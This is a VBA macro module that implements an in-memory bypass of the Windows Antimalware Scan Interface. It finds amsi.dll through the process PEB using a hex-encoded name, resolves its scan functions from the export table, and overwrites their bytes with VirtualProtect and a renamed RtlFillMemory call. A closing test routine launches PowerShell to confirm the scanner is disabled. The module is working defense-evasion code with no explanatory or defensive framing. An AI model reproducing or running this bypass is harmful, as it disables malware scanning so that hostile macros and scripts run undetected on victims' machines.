Attribute VB_Name = "Module1"

' from https://codes-sources.commentcamarche.net/source/42365-affinite-des-processus-et-des-threads
Private Type PROCESS_BASIC_INFORMATION
    ExitStatus      As Long
    PEBBaseAddress  As Long
    AffinityMask    As Long
    BasePriority    As Long
    UniqueProcessId As Long
    ParentProcessId As Long
End Type

Private Declare Function NtQueryInformationProcess Lib "NTDLL.DLL" ( _
   ByVal ProcessHandle As LongPtr, _
   ByVal processInformationClass As Long, _
   ByRef processInformation As PROCESS_BASIC_INFORMATION, _
   ByVal processInformationLength As Long, _
   ByRef returnLength As Long _
) As Integer

' From https://foren.activevb.de/archiv/vb-net/thread-76040/beitrag-76164/ReadProcessMemory-fuer-GetComma/
Private Type PEB
    Reserved1(1) As Byte
    BeingDebugged As Byte
    Reserved2 As Byte
    Reserved3(1) As Long
    Ldr As Long
    ProcessParameters As Long
    Reserved4(103) As Byte
    Reserved5(51) As Long
    PostProcessInitRoutine As Long
    Reserved6(127) As Byte
    Reserved7 As Long
    SessionId As Long
End Type

Private Declare Function ReadProcessMemory Lib "kernel32.dll" ( _
    ByVal hProcess As LongPtr, _
    ByVal lpBaseAddress As LongPtr, _
    ByVal lpBuffer As LongPtr, _
    ByVal nSize As Long, _
    ByRef lpNumberOfBytesRead As Long _
) As Boolean

Private Declare PtrSafe Function VirtualProtect Lib "kernel32" (lpAddress As Any, ByVal dwSize As LongPtr, ByVal flNewProtect As Long, lpflOldProtect As Long) As Long

Private Declare PtrSafe Sub ByteSwapper Lib "kernel32.dll" Alias "RtlFillMemory" (Destination As Any, ByVal Length As Long, ByVal Fill As Byte)

Sub Main()

    Dim size As Long
    Dim PEB As PEB
    Dim pbi As PROCESS_BASIC_INFORMATION

    Dim ReadBytes As Long
    Dim SingleByte As Byte
    Dim ByteToWrite As String
    Dim PEBLdrAddress As Long
    Dim ReadAddress As Long
    
    Dim InLoadOrderLinksStart As String
    Dim InLoadOrderLinksEnd As String
    
    Dim DLLNameBytes As String
    
    Dim Patched As Integer
    
    Result = NtQueryInformationProcess(-1, 0, pbi, Len(pbi), size)
    
    success = ReadProcessMemory(-1, pbi.PEBBaseAddress, VarPtr(PEB), Len(PEB), size)
    ' peb.ProcessParameters now contains the address to the parameters - read them
    success = ReadProcessMemory(-1, PEB.ProcessParameters, VarPtr(parameters), Len(parameters), size)

    'PEB LDR
    'Debug.Print Hex(PEB.Ldr)
    PEBLdrAddress = PEB.Ldr
    
    'PEBLdrAddress+0C
    success = ReadProcessMemory(-1, ByVal (PEBLdrAddress + 12), VarPtr(ReadBytes), Len(ReadBytes), size)
    InLoadOrderLinksStart = ReadBytes
    'Debug.Print "Start=" & Hex(InLoadOrderLinksStart)
    
    'PEBLdrAddress+10
    success = ReadProcessMemory(-1, ByVal (PEBLdrAddress + 16), VarPtr(ReadBytes), Len(ReadBytes), size)
    InLoadOrderLinksEnd = ReadBytes
    'Debug.Print "End=" & Hex(InLoadOrderLinksEnd)
    
    dllentry = InLoadOrderLinksStart
    Do Until dllentry = InLoadOrderLinksEnd
        current = dllentry
        'Debug.Print "Current=" & Hex(current)
        DLLNameBytes = ""
        
        success = ReadProcessMemory(-1, ByVal (dllentry), VarPtr(ReadBytes), Len(ReadBytes), size)
        dllentry = ReadBytes
        'Debug.Print "Next Item=" & Hex(dllentry)
        
        success = ReadProcessMemory(-1, ByVal (current + 48), VarPtr(ReadBytes), Len(ReadBytes), size)
        DllNameBuffer = ReadBytes
        'Debug.Print Hex(DllNameBuffer)
        
        'First Batch
        success = ReadProcessMemory(-1, ByVal (DllNameBuffer), VarPtr(ReadBytes), Len(ReadBytes), size)
        firstbytes = Hex(ReadBytes)
        'Debug.Print Hex(ReadBytes)
        firstbytes = Replace(firstbytes, "00", "")
        If Len(firstbytes) = 4 Then
            b1 = Mid(firstbytes, 1, 2)
            b2 = Mid(firstbytes, 3, 2)
            firstbytes = b2 & b1
        End If
          
        'Second Batch
        success = ReadProcessMemory(-1, ByVal (DllNameBuffer + 4), VarPtr(ReadBytes), Len(ReadBytes), size)
        secondbytes = Hex(ReadBytes)
        'Debug.Print Hex(ReadBytes)
        secondbytes = Replace(secondbytes, "00", "")
        If Len(secondbytes) = 4 Then
            b1 = Mid(secondbytes, 1, 2)
            b2 = Mid(secondbytes, 3, 2)
            secondbytes = b2 & b1
        End If
       
        'Third Batch
        success = ReadProcessMemory(-1, ByVal (DllNameBuffer + 8), VarPtr(ReadBytes), Len(ReadBytes), size)
        thirdbytes = Hex(ReadBytes)
        'Debug.Print Hex(ReadBytes)
        thirdbytes = Replace(thirdbytes, "00", "")
        If Len(thirdbytes) = 4 Then
            b1 = Mid(thirdbytes, 1, 2)
            b2 = Mid(thirdbytes, 3, 2)
            thirdbytes = b2 & b1
        End If
        
        'Fourth Batch
        success = ReadProcessMemory(-1, ByVal (DllNameBuffer + 12), VarPtr(ReadBytes), Len(ReadBytes), size)
        fourthbytes = Hex(ReadBytes)
        'Debug.Print Hex(ReadBytes)
        fourthbytes = Replace(fourthbytes, "00", "")
        If Len(fourthbytes) = 4 Then
            b1 = Mid(fourthbytes, 1, 2)
            b2 = Mid(fourthbytes, 3, 2)
            fourthbytes = b2 & b1
        End If
        
        'Fifth Batch
        success = ReadProcessMemory(-1, ByVal (DllNameBuffer + 16), VarPtr(ReadBytes), Len(ReadBytes), size)
        fifthbytes = Hex(ReadBytes)
        'Debug.Print Hex(ReadBytes)
        fifthbytes = Replace(fifthbytes, "00", "")
        If Len(fifthbytes) = 4 Then
            b1 = Mid(fifthbytes, 1, 2)
            b2 = Mid(fifthbytes, 3, 2)
            fifthbytes = b2 & b1
        End If

        'Build String Back together after having rid it of unicode and sorted endians
        DLLNameBytes = firstbytes & secondbytes & thirdbytes & fourthbytes & fifthbytes

        'Debug.Print DLLNameBytes

        If InStr(1, DLLNameBytes, "616D73692E646C6C") Then
            Debug.Print "DLL found at: " & Hex(current)
            'Debug.Print "dt _LDR_DATA_TABLE_ENTRY " & Hex(current)

            success = ReadProcessMemory(-1, ByVal (current + 24), VarPtr(ReadBytes), Len(ReadBytes), size)
            BaseAddress = ReadBytes
            Debug.Print "DLL BaseAddress: " & Hex(BaseAddress)
               
            'To get to our function addresses we need to work through the following structures
            '_IMAGE_DOS_HEADER -
            'dt _IMAGE_DOS_HEADER + base address
            'get the value of e_lfanew which is F8
            
            '_IMAGE_NT_HEADERS
            'dt _IMAGE_NT_HEADERS baseaddress+F8
            
            '_IMAGE_OPTIONAL_HEADER
            'dt _IMAGE_OPTIONAL_HEADER baseaddress+F8+18
            
            '_IMAGE_DATA_DIRECTORY
            'dt _IMAGE_DATA_DIRECTORY baseaddress+F8+18+60
            
            '_IMAGE_EXPORT_DIRECTORY
            'dt _IMAGE_EXPORT_DIRECTORY baseaddress + value from above virtual address
            
            'AddressOfFunctions = _IMAGE_EXPORT_DIRECTORY+1C
            'AddressOfNames = _IMAGE_EXPORT_DIRECTORY+20
            'AddressOfNameOrdinals = _IMAGE_EXPORT_DIRECTORY+24
            
            success = ReadProcessMemory(-1, ByVal (BaseAddress + 248 + 24 + 96), VarPtr(ReadBytes), Len(ReadBytes), size)
            'Debug.Print "Virtual Address: " & Hex(ReadBytes)
            IMAGE_EXPORT_DIRECTORY = BaseAddress + ReadBytes
            'Debug.Print "IMAGE_EXPORT_DIRECTORY: " & Hex(IMAGE_EXPORT_DIRECTORY)
            
            AddressOfFunctions = IMAGE_EXPORT_DIRECTORY + 28
            Debug.Print "AddressOfFunctions: " & Hex(AddressOfFunctions)
                        
            success = ReadProcessMemory(-1, ByVal (AddressOfFunctions), VarPtr(ReadBytes), Len(ReadBytes), size)
            FuncStart = BaseAddress + ReadBytes
            'Debug.Print "Function Start: " & Hex(FuncStart)
                   
            'The functions we want are always in the same place in the list
            'so we can calculate their relative addresses
            success = ReadProcessMemory(-1, ByVal (FuncStart + (3 * 4)), VarPtr(ReadBytes), Len(ReadBytes), size)
            ASBuffer = BaseAddress + ReadBytes
            Debug.Print "A_Scan_Buffer Function Address: " & Hex(ASBuffer)
            
            success = ReadProcessMemory(-1, ByVal (FuncStart + (4 * 4)), VarPtr(ReadBytes), Len(ReadBytes), size)
            ASString = BaseAddress + ReadBytes
            Debug.Print "A_Scan_String Function Address: " & Hex(ASString)
                        
            'There are numerous different ways that the relevant
            'Functions can be patched out, modify as necessary
            
            'Patch out first function
            ReadAddress = ASString + 5
            success = ReadProcessMemory(-1, ByVal (ReadAddress), VarPtr(SingleByte), Len(SingleByte), size)
            ReadByte = SingleByte
            Debug.Print "Single Byte Value found at " & Hex(ReadAddress) & " " & Hex(ReadByte)
            'Check the value we read is expected and if so, patch
            Result = VirtualProtect(ByVal ReadAddress, 1, 64, 0)
            ByteSwapper ByVal (ReadAddress), 1, Val("&H" & "EB")
                                   
            ReadAddress = ASString + 6
            success = ReadProcessMemory(-1, ByVal (ReadAddress), VarPtr(SingleByte), Len(SingleByte), size)
            ReadByte = SingleByte
            Debug.Print "Single Byte Value found at " & Hex(ReadAddress) & " " & Hex(ReadByte)
            'Check the value we read is expected and if so, patch
            Result = VirtualProtect(ByVal ReadAddress, 1, 64, 0)
            ByteSwapper ByVal (ReadAddress), 1, Val("&H" & "3E")
           
            'Patch out second function
            ReadAddress = ASBuffer + 10
            success = ReadProcessMemory(-1, ByVal (ReadAddress), VarPtr(SingleByte), Len(SingleByte), size)
            ReadByte = SingleByte
            Debug.Print "Single Byte Value found at " & Hex(ReadAddress) & " " & Hex(ReadByte)
            'Check the value we read is expected and if so, patch
            Result = VirtualProtect(ByVal ReadAddress, 1, 64, 0)
            ByteSwapper ByVal (ReadAddress), 1, Val("&H" & "E9")
            
            'Patch out second function
            ReadAddress = ASBuffer + 11
            success = ReadProcessMemory(-1, ByVal (ReadAddress), VarPtr(SingleByte), Len(SingleByte), size)
            ReadByte = SingleByte
            Debug.Print "Single Byte Value found at " & Hex(ReadAddress) & " " & Hex(ReadByte)
            'Check the value we read is expected and if so, patch
            Result = VirtualProtect(ByVal ReadAddress, 1, 64, 0)
            ByteSwapper ByVal (ReadAddress), 1, Val("&H" & "8F")
            
            'Patch out second function
            ReadAddress = ASBuffer + 12
            success = ReadProcessMemory(-1, ByVal (ReadAddress), VarPtr(SingleByte), Len(SingleByte), size)
            ReadByte = SingleByte
            Debug.Print "Single Byte Value found at " & Hex(ReadAddress) & " " & Hex(ReadByte)
            'Check the value we read is expected and if so, patch
            Result = VirtualProtect(ByVal ReadAddress, 1, 64, 0)
            ByteSwapper ByVal (ReadAddress), 1, Val("&H" & "00")
            
            'Patch out second function
            ReadAddress = ASBuffer + 13
            success = ReadProcessMemory(-1, ByVal (ReadAddress), VarPtr(SingleByte), Len(SingleByte), size)
            ReadByte = SingleByte
            Debug.Print "Single Byte Value found at " & Hex(ReadAddress) & " " & Hex(ReadByte)
            'Check the value we read is expected and if so, patch
            Result = VirtualProtect(ByVal ReadAddress, 1, 64, 0)
            ByteSwapper ByVal (ReadAddress), 1, Val("&H" & "00")
            
            'Patch out second function
            ReadAddress = ASBuffer + 14
            success = ReadProcessMemory(-1, ByVal (ReadAddress), VarPtr(SingleByte), Len(SingleByte), size)
            ReadByte = SingleByte
            Debug.Print "Single Byte Value found at " & Hex(ReadAddress) & " " & Hex(ReadByte)
            'Check the value we read is expected and if so, patch
            Result = VirtualProtect(ByVal ReadAddress, 1, 64, 0)
            ByteSwapper ByVal (ReadAddress), 1, Val("&H" & "00")
            
            Exit Do
        End If
    Loop
    
End Sub



Sub FailTest()

'The below is enough to set things off
MsgBox "This should fail, if patching not applied", vbInformation
x = Shell("powershell.exe")

End Sub




